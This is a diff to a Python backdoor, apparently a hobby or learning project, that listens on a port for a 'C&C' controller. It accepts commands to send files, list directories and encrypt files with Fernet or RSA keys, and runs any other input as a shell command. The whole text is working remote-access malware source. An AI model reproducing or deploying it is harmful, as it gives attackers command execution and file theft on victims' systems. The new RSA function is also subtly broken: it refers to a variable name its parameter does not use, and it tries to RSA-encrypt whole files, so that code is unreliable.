@@ -2,11 +2,18 @@ import socket
 import subprocess
 import os
 from cryptography.fernet import Fernet
+import rsa
 
+# Socket
 HOST = ''
 PORT = 5000
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.bind((HOST, PORT))
+s.listen(1)
+conn, addr = s.accept()
+print("[TARGET] C&C connected.")
 
-#Funzioni
+# Funzioni
 def obtain_dir():
     current_dir = os.getcwd()
     directory_files = os.listdir('.')
@@ -32,30 +39,39 @@ def cyph_file(file_name, fernet):
         return header_enc + b"\n" + encrypted_file
     except FileNotFoundError:
         return b"Error: file does not exist."
+
+def cyph_file_asym(file_name, publickey):
+    try:
+        with open(file_name, "rb") as f:
+            file_data = f.read()
+        # Header con nome file + file in binario
+        header_enc = f"enc_{file_name}\n".encode()
+        encrypted_asym_file = rsa.encrypt(file_data, public_key)
+        return header_enc + b"\n" + encrypted_asym_file
+    except FileNotFoundError:
+        return b"Error: file does not exist."
     
-# Socket
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.bind((HOST, PORT))
-s.listen(1)
-conn, addr = s.accept()
-print("[TARGET] C&C connected.")
 
 while True:
     command = conn.recv(1024).decode().strip()
     print("Command received.")
     if command.upper() == "STOP":
         break
-
+    
+    # Divide il comando in due parti
     parts = command.split(maxsplit=1)
     cmd = parts[0].upper()
 
+    # Output se il comando è INVIA
     if cmd == "INVIA" and len(parts) > 1:
         output = send_file(parts[1]) 
         
+    # Output se il comando è ELENCO
     elif cmd == "ELENCO":
         output = obtain_dir()
         output = output.encode()
         
+    # Output se il comando è CIFRA
     elif cmd == "CIFRA" and len(parts) > 1:
         message = "SYN"
         message = message.encode()
@@ -64,7 +80,14 @@ while True:
         conn.sendall(sym_key)
         fernet = Fernet(sym_key)
         output = cyph_file(parts[1], fernet)
+    
+    # Output se il comando è PKENC
+    elif cmd == "PKENC" and len(parts) > 1:
+        received_key = conn.recv(1024)
+        public_key = rsa.PublicKey.load_pkcs1(received_key)
+        output = cyph_file_asym(parts[1], public_key)
         
+    # Svolge comandi cmd
     else:
         execute = subprocess.run(command, shell=True, capture_output=True, text=True)
         output = execute.stdout + execute.stderr
